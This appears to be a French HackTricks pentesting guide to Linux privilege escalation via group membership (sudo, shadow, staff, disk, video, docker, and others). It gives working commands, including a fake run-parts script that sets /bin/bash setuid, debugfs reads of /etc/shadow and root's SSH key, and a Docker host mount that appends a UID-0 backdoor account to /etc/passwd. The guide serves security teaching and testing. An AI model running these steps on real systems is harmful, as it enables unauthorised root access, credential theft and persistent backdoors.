# Groupes intéressants - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Groupes Sudo/Admin

### **PE - Méthode 1**

**Parfois**, la politique **/etc/sudoers** d'un système (ou un fichier inclus par celle-ci) contient des entrées telles que :<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Cela signifie que tout utilisateur correspondant à l'une ou l'autre entrée peut exécuter n'importe quelle commande en tant que n'importe quel utilisateur cible via `sudo` (sous réserve du reste de la politique).<sup>[[3]](#references)</sup>

Si c'est le cas, pour **devenir root, il vous suffit d'exécuter** :
```
sudo su
```
### PE - Method 2

Trouver tous les binaires suid et vérifier si le binaire **Pkexec** est présent :
```bash
find / -perm -4000 2>/dev/null
```
Si **pkexec est un binaire SUID**, il ne peut exécuter un programme en tant qu'un autre utilisateur que lorsque polkit autorise l'action demandée ; le bit SUID seul ne garantit pas l'accès root. Vérifiez la policy installée ainsi que l'autorisation de la session cible au lieu de supposer que l'appartenance aux groupes **sudo** ou **admin** suffit.<sup>[[4]](#references)[[5]](#references)</sup>

Sur les distributions qui utilisent encore l'ancien backend Local Authority, inspectez ses règles de groupe avec :
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Les noms et les valeurs par défaut des groupes pertinents varient selon la distribution ; un groupe n’est utile ici que si la politique locale le nomme.<sup>[[5]](#references)</sup>

Pour **devenir root, vous pouvez exécuter** :
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Si vous essayez d’exécuter **pkexec** et obtenez cette **erreur** :
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
Dans une session SSH sans agent d’authentification enregistré, `pkexec` peut échouer avec cette erreur même si la policy autoriserait normalement l’action ; polkit documente `pkttyagent` comme un agent d’authentification textuel pour les sessions non graphiques. Le comportement exact dépend de la version et de la distribution ; vérifiez donc la policy locale et la configuration de l’agent. Une solution de contournement signalée pour certaines versions affectées de NixOS utilise **2 sessions SSH différentes**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Groupe wheel

Parfois, une policy sudoers peut également contenir cette entrée :
```
%wheel	ALL=(ALL:ALL) ALL
```
Cela signifie que tout utilisateur correspondant à l’entrée peut exécuter n’importe quelle commande en tant que n’importe quel utilisateur cible via `sudo` (sous réserve du reste de la policy).<sup>[[3]](#references)</sup>

Si c’est le cas, pour **devenir root, il suffit d’exécuter** :
```
sudo su
```
## Groupe shadow

Sur les systèmes dont les permissions le permettent, les utilisateurs du groupe **shadow** peuvent **lire** **/etc/shadow** ; vérifiez le mode et les ACL réels sur la cible :<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Alors, lisez le fichier et essayez de **casser quelques hashes**.

Nuance importante concernant l'état de verrouillage lors du triage des hashes :
- Les entrées contenant `!` ou `*` sont généralement non interactives pour les connexions par mot de passe.
- `!hash` signifie que le mot de passe a été verrouillé ; les caractères restants représentent le champ du mot de passe avant son verrouillage.
- Un champ contenant `*` n'est pas un hash `crypt(3)` valide et empêche la connexion par mot de passe UNIX ; n'en déduisez pas si un mot de passe a été défini auparavant.
Cela est utile pour la classification des comptes, même lorsque la connexion directe est bloquée.<sup>[[6]](#references)</sup>

## Groupe Staff

**staff** : Permet aux utilisateurs d'ajouter des modifications locales au système (`/usr/local`) sans avoir besoin des privilèges root (notez que les exécutables dans `/usr/local/bin` se trouvent dans la variable PATH de tout utilisateur et peuvent « remplacer » les exécutables de `/bin` et `/usr/bin` portant le même nom). Comparez avec le groupe « adm », qui est davantage lié à la surveillance et à la sécurité.<sup>[[2]](#references)[[7]](#references)</sup>

Dans les configurations Debian où `/usr/local/bin` précède `/usr/bin` dans `PATH` (comme dans les exemples ci-dessous), une commande non qualifiée utilise d'abord la copie située dans `/usr/local/bin` ; vérifiez le `PATH` effectif sur la cible.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Si un processus privilégié résout une commande non qualifiée via un `/usr/local/bin` accessible en écriture, le remplacement de cette commande peut permettre son exécution avec les privilèges du processus ; confirmez le chemin réel et le déclencheur avant tout test.

Sur les systèmes Ubuntu, `pam_motd` exécute des scripts via `run-parts --lsbsysinit` en tant que root lors de la connexion ; les tâches cron peuvent également utiliser `run-parts`, mais cela dépend de la distribution et de la configuration.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Lors d'une nouvelle connexion SSH, `pspy` peut aider à confirmer si ce chemin est effectivement invoqué sur la cible ; il peut observer les lignes de commande des processus sans les privilèges root.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Groupe disk

L’appartenance au groupe **disk** peut accorder un accès brut aux périphériques bloc et est souvent **proche d’un accès root** ; Debian le décrit comme étant globalement équivalent à root, mais vérifiez les permissions réelles des périphériques et la configuration du stockage sur la cible.<sup>[[7]](#references)</sup>

Les chemins de périphériques courants incluent `/dev/sd*`, mais NVMe et d’autres configurations de stockage utilisent des noms différents.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` fonctionne sur les filesystems ext2/ext3/ext4 ; les chemins tels que `/root` et `/etc/shadow` ci-dessus sont des fichiers à l’intérieur du filesystem ouvert, tandis que le deuxième argument de `dump` est un chemin de sortie sur le filesystem natif.<sup>[[8]](#references)</sup> Par exemple, ceci extrait `/tmp/asd1.txt` du filesystem ouvert vers `/tmp/asd2.txt` sur le filesystem natif :
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
L’option `-w` ouvre le système de fichiers en lecture-écriture, et la commande `write` copie un fichier natif dans le système de fichiers ouvert. Évitez de l’utiliser sur un système de fichiers monté et actif, car les modifications directes peuvent corrompre le système de fichiers ; travaillez à partir d’une image hors ligne lorsque cela est possible.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Groupe Video

À l’aide de la commande `w`, vous pouvez trouver **qui est connecté au système** ; elle affichera une sortie similaire à la suivante.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
L’entrée **tty1** identifie la première console virtuelle Linux ; elle ne prouve pas à elle seule qu’un utilisateur est physiquement présent sur la machine, en particulier dans les conteneurs ou autres environnements.<sup>[[21]](#references)</sup>

Sur les systèmes exposant un périphérique framebuffer lisible, l’appartenance au groupe **video** peut accorder l’accès à ce périphérique. L’interface framebuffer Linux documente `/dev/fb0` comme un périphérique mémoire lisible pouvant être copié pour réaliser une capture d’écran ; le chemin `/sys/class/graphics/fb0/virtual_size` n’est disponible que lorsque cet attribut sysfs fbdev est présent. Vérifiez donc d’abord la cible.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Si la version installée de **GIMP** expose un importateur de données brutes, ouvrez **`screen.raw`** avec cet importateur ; la prise en charge et les contrôles varient selon la version et le plug-in.<sup>[[22]](#references)</sup>

![Groupe Disk - Groupe Video : Pour ouvrir l'image brute, vous pouvez utiliser GIMP, sélectionner le fichier screen.raw et sélectionner Raw image data comme type de fichier](<../../../images/image (463).png>)

Définissez la largeur et la hauteur de l'image pour qu'elles correspondent à la géométrie du framebuffer ; essayez les formats de pixels/Image Types disponibles jusqu'à ce que la sortie soit lisible.<sup>[[9]](#references)</sup>

![Groupe Disk - Groupe Video : Modifiez ensuite la largeur et la hauteur pour utiliser celles de l'écran et vérifiez différents Image Types (puis sélectionnez celui qui affiche le mieux l'écran)](<../../../images/image (317).png>)

## Groupe root

L'appartenance au groupe **root** ne fournit pas l'UID de root, mais les fichiers accessibles en écriture par le groupe et appartenant à `root` peuvent tout de même être intéressants lorsque des services ou des bibliothèques privilégiés les utilisent. Vérifiez les permissions réelles du fichier et la manière dont il est utilisé avant de le considérer comme une voie d'escalade de privilèges.

**Vérifier quels fichiers les membres de root peuvent modifier** :
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Groupe Docker

L’appartenance au groupe `docker` accorde un accès de niveau root au daemon Docker lors des installations rootful standard. Comme les bind mounts sont accessibles en lecture-écriture par défaut, un utilisateur capable de contrôler ce daemon peut monter le `/` de l’hôte dans un container et modifier les fichiers de l’hôte ; cela lui donne effectivement les privilèges root sur l’hôte.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Enfin, si aucune des suggestions précédentes ne vous convient, ou si elles ne fonctionnent pas pour une raison quelconque (Docker API firewall ?), vous pouvez toujours essayer de **run a privileged container and escape from it**, comme expliqué ici :

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Si vous disposez des permissions d’écriture sur le socket Docker, consultez [**cet article sur l’escalade de privilèges en abusant du socket Docker**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Généralement, les **membres** du groupe **`adm`** disposent des permissions nécessaires pour **lire les fichiers de logs** situés dans _/var/log/_.\
Par conséquent, si vous avez compromis un utilisateur appartenant à ce groupe, vous devriez absolument **examiner les logs**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Ces groupes ont des significations spécifiques aux services et aux distributions. Debian documente `backup` pour la sauvegarde/restauration déléguée, `lp` pour les daemons d’impression et `mail` pour `/var/mail` ; vérifiez donc les permissions locales avant de considérer l’appartenance au groupe comme une voie de privilèges.<sup>[[7]](#references)</sup>

Ils constituent souvent des vecteurs de **credential-discovery** plutôt que des vecteurs directs vers root :
- **backup** : peut exposer des archives contenant des configurations, des clés, des dumps de bases de données ou des tokens.
- **operator** : accès opérationnel spécifique à la plateforme pouvant leak des données sensibles d’exécution.
- **lp** : les files d’attente et spools d’impression peuvent contenir le contenu de documents.
- **mail** : les spools de messagerie peuvent exposer des liens de réinitialisation, des OTP et des credentials internes.

Considérez l’appartenance à ces groupes comme une découverte à forte valeur d’exposition de données, puis effectuez un pivot via la réutilisation de mots de passe/tokens.

## Auth group

Sur OpenBSD, lorsque S/Key est configuré, `/etc/skey` appartient à `root:auth` et l’accès à ses enregistrements nécessite le groupe `auth` ; les enregistrements YubiKey sont stockés dans `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Une configuration vulnérable d’OpenBSD 6.6 avec S/Key ou YubiKey activé permettait à des utilisateurs locaux disposant des privilèges `auth` de devenir root ; Qualys documente les prérequis et la chaîne d’exploitation, et le PoC lié l’implémente.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Authentification de pkexec/pkttyagent sans session GUI (problème NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Wiki Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Pages de manuel Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Manuel de référence de polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Manuel de référence de polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Page de manuel Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manuel de sécurisation de Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Page de manuel Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Le périphérique Frame Buffer — Documentation du kernel Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Pages de manuel Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Pages de manuel Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — surveillance de processus Linux sans privilèges](https://github.com/DominicBreuker/pspy)
- [13] [Sécurité de Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Gérer Docker en tant qu’utilisateur non-root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Exécution de containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Pages de manuel OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Pages de manuel OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnérabilités d’authentification dans OpenBSD — Avis de sécurité Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC d’exploitation locale](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Page de manuel Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Périphériques alloués par Linux (version 4.x et ultérieure)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importation et exportation d’images — Documentation GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
